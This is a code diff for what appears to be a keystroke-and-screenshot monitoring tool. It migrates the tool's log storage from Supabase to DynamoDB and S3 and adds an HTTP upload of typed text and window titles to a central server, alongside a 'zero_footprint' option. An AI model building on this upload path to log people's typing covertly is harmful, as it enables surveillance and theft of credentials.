@@ -3074,70 +3644,96 @@ def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot
     if is_monitoring_disabled:
         return
     device_id = get_device_id()
-    supabase_success = False
+    aws_success = False
     
-    # 1. Database logging (if Supabase is initialized)
-    if supabase is not None:
+    # 1. DynamoDB direct write (if on server or local with AWS keys)
+    if logs_tbl is not None:
         try:
             now_date = datetime.now().strftime("%Y-%m-%d")
+            log_uuid = str(uuid.uuid4())
+            timestamp_id = f"{timestamp}#{log_uuid[:8]}"
+            ttl_timestamp = int(time.time()) + (30 * 86400) # 30 days DynamoDB TTL auto-expire
             
-            # Redundancy cleanup: Delete recent log entries in the same window that are superseded by this log
+            # Redundancy cleanup: query recent logs for this device
             try:
-                res = supabase.table("activity_logs") \
-                    .select("id, timestamp, typed_text, screenshot_filename") \
-                    .eq("device_id", device_id) \
-                    .eq("window_title", window_title) \
-                    .neq("window_title", "__DEVICE_CONFIG__") \
-                    .neq("window_title", "__CLIENT_SYNC_STATUS__") \
-                    .order("timestamp", desc=True) \
-                    .limit(5) \
-                    .execute()
-                if res.data:
-                    for old_entry in res.data:
-                        old_id = old_entry["id"]
-                        old_text = old_entry["typed_text"]
-                        old_file = old_entry["screenshot_filename"]
+                res = logs_tbl.query(
+                    KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
+                    ExpressionAttributeValues={
+                        ":did": device_id,
+                        ":start": f"{now_date} 00:00:00#",
+                        ":end": f"{timestamp}#~"
+                    },
+                    ScanIndexForward=False,
+                    Limit=5
+                )
+                items = res.get("Items", [])
+                for old_entry in items:
+                    old_ts_id = old_entry["timestamp_id"]
+                    old_text = old_entry.get("typed_text", "")
+                    old_file = old_entry.get("screenshot_filename")
+                    
+                    try:
+                        t1 = datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S")
+                        t2 = datetime.strptime(old_entry.get("timestamp", timestamp), "%Y-%m-%d %H:%M:%S")
+                        time_diff = abs((t1 - t2).total_seconds())
+                    except Exception:
+                        time_diff = 0
                         
-                        try:
-                            t1 = datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S")
-                            t2 = datetime.strptime(old_entry["timestamp"], "%Y-%m-%d %H:%M:%S")
-                            time_diff = abs((t1 - t2).total_seconds())
-                        except Exception:
-                            time_diff = 0
-                            
-                        # If the old log is recent (within 20 minutes) and its text is fully contained in the new log
-                        clean_old = clean_log_text(old_text)
-                        clean_new = clean_log_text(line_str)
-                        if time_diff < 1200 and clean_old and clean_new != clean_old and clean_old in clean_new:
-                            # Delete screenshot from storage
-                            if old_file and SUPABASE_BUCKET:
-                                try:
-                                    supabase.storage.from_(SUPABASE_BUCKET).remove([old_file])
-                                except Exception:
-                                    pass
-                            # Delete database row
-                            supabase.table("activity_logs").delete().eq("id", old_id).execute()
+                    clean_old = clean_log_text(old_text)
+                    clean_new = clean_log_text(line_str)
+                    if time_diff < 1200 and clean_old and clean_new != clean_old and clean_old in clean_new:
+                        if old_file and s3_client and S3_BUCKET:
+                            try:
+                                s3_client.delete_object(Bucket=S3_BUCKET, Key=old_file)
+                            except Exception:
+                                pass
+                        logs_tbl.delete_item(Key={"device_id": device_id, "timestamp_id": old_ts_id})
             except Exception as re:
-                print(f"Failed to perform redundancy check: {re}")
-
-            data = {
+                print(f"Failed to perform redundancy check in DynamoDB: {re}")
+                
+            item = {
                 "device_id": device_id,
+                "timestamp_id": timestamp_id,
+                "id": log_uuid,
                 "timestamp": timestamp,
                 "created_date": now_date,
                 "window_title": window_title,
                 "typed_text": line_str,
-                "screenshot_url": screenshot_url,
-                "screenshot_filename": screenshot_filename
+                "screenshot_url": screenshot_url or "",
+                "screenshot_filename": screenshot_filename or "",
+                "ttl": ttl_timestamp
             }
-            res_insert = supabase.table("activity_logs").insert(data).execute()
-            supabase_success = True
-            if res_insert.data:
-                return res_insert.data[0].get("id")
+            logs_tbl.put_item(Item=item)
+            aws_success = True
+            return {"device_id": device_id, "timestamp_id": timestamp_id}
         except Exception as e:
-            print(f"Failed to insert log to Supabase DB: {e}")
+            print(f"Failed to insert log to DynamoDB: {e}")
+            
+    # 2. HTTP Fallback to AWS Central Server (client mode without AWS keys)
+    server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
+    if not aws_success and server_url:
+        try:
+            req = urllib.request.Request(
+                f"{server_url.rstrip('/')}/api/client/log",
+                data=json.dumps({
+                    "device_id": device_id,
+                    "timestamp": timestamp,
+                    "window_title": window_title,
+                    "line_str": line_str,
+                    "screenshot_url": screenshot_url,
+                    "screenshot_filename": screenshot_filename
+                }).encode('utf-8'),
+                headers={"Content-Type": "application/json"}
+            )
+            with urllib.request.urlopen(req, timeout=10) as r:
+                res_data = json.loads(r.read().decode('utf-8'))
+                aws_success = True
+                return {"device_id": device_id, "timestamp_id": f"{timestamp}#{res_data.get('id', '')[:8]}"}
+        except Exception as he:
+            print(f"Failed to send log to AWS central server: {he}")
 
     # 2. Local Fallback/Backup logging
-    if not zero_footprint and not supabase_success:
+    if not zero_footprint and not aws_success:
         try:
             date_str = datetime.now().strftime("%Y-%m-%d")
             log_file = os.path.join("logs", f"log_{date_str}.txt")
@@ -3311,60 +3907,19 @@ def run_server():
 
 def server_storage_cleaner():
     """
-    Runs on the server backend to clean up storage if database size limit is approaching.
+    AWS Native S3 Lifecycle (30-day auto-expire) and DynamoDB TTL
+    automatically maintain zero-cost storage in AWS in the background.
     """
-    if supabase is None:
-        return
     while True:
         try:
-            # Check database count once every 24 hours
             time.sleep(86400)
-            
-            # Count exact rows in activity_logs
-            res = supabase.table("activity_logs").select("id", count="exact").execute()
-            total_rows = res.count if hasattr(res, 'count') else (len(res.data) if res.data else 0)
-            
-            # Threshold: 30,000 rows (roughly 600MB of storage/data size)
-            if total_rows > 30000:
-                print(f"[Cleaner] Database rows ({total_rows}) exceeds threshold. Triggering 50% cleanup...")
-                
-                # Fetch the oldest 50% of logs
-                cleanup_count = total_rows // 2
-                old_res = supabase.table("activity_logs") \
-                    .select("id, screenshot_filename") \
-                    .order("timestamp", desc=False) \
-                    .limit(cleanup_count) \
-                    .execute()
-                    
-                if old_res.data:
-                    # 1. Gather all files to delete from Storage
-                    files_to_delete = [
-                        row["screenshot_filename"] 
-                        for row in old_res.data 
-                        if row.get("screenshot_filename")
-                    ]
-                    
-                    # Batch delete from Supabase storage (max 100 at a time)
-                    for i in range(0, len(files_to_delete), 100):
-                        batch = files_to_delete[i:i+100]
-                        try:
-                            if SUPABASE_BUCKET:
-                                supabase.storage.from_(SUPABASE_BUCKET).remove(batch)
-                        except Exception as e:
-                            print(f"[Cleaner] Failed to remove storage batch: {e}")
-                            
-                    # 2. Delete database rows
-                    row_ids = [row["id"] for row in old_res.data]
-                    for i in range(0, len(row_ids), 100):
-                        batch_ids = row_ids[i:i+100]
-                        try:
-                            supabase.table("activity_logs").delete().in_("id", batch_ids).execute()
-                        except Exception as e:
-                            print(f"[Cleaner] Failed to delete DB row batch: {e}")
-                            
-                    print(f"[Cleaner] Successfully cleaned up {cleanup_count} oldest logs and screenshots.")
+            if logs_tbl is not None:
+                res = logs_tbl.scan(Select='COUNT')
+                total_items = res.get('Count', 0)
+                if total_items > 30000:
+                    print(f"[Cleaner] DynamoDB log count: {total_items}. Automatic TTL expiration active.")
         except Exception as e:
-            print(f"[Cleaner] Error in server storage cleaner: {e}")
+            print(f"[Cleaner] Storage monitor notice: {e}")
 
 if __name__ == '__main__':
     # Start server storage cleaner thread to monitor database limits
